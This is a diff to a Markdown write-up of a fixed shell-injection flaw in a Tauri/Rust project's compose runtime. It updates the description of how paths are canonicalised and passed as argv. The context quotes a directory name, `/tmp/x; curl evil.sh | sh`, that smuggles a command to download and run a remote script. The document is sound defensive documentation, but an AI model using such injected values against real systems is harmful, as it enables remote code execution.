@@ -69,9 +69,11 @@ not escape shell metacharacters. A directory named `/tmp/x; curl evil.sh | sh`
 executed.
 
 **Now:** [`compose.rs`](../tauri-rs/src-tauri/src/runtime/compose.rs) builds argv
-and passes it to `tokio::process::Command`, never a shell string. The directory is
-canonicalised and confirmed to be a directory before use, so a bad path fails
-cleanly instead of running the command somewhere unexpected.
+and passes it to `tokio::process::Command`, never a shell string. The path is
+canonicalised and confirmed to be a directory — or a file, whose directory is
+then used — before it becomes the working directory, so a bad path fails cleanly
+instead of running the command somewhere unexpected. A named file reaches compose
+as a `-f` argument in that same argv, not as text in a command line.
 
 ### 4. A route that could never work
 
